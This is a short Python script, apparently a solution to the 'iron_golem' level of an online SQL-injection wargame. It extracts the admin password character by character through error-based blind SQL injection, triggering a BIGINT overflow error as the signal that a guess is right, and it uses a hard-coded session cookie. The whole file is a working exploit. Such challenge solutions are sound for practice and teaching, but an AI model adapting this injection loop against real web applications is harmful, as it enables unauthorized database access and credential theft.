import urllib.request
import requests

url='https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php'
headers = { 'Cookie': 'PHPSESSID=saghrkfp5s6ev9kd23gbl134qe' }
pw=""

for i in range (1,33):
    for j in range(48, 123):
        if (j == 95):
            continue
        query='?pw=%27%20or%20id=%27admin%27%20and%20%20IF(ascii(mid(pw,{},1))={},(abs(-9223372036854775808)),2)%23'.format(i, j)
        r = requests.get(url + query, headers=headers)
        if r.text.find("BIGINT value is out of range in 'abs(-(9223372036854775808))'") != -1:
            pw = pw + chr(j)
            print('substr(password,1,{}) is '.format(i), pw)
            break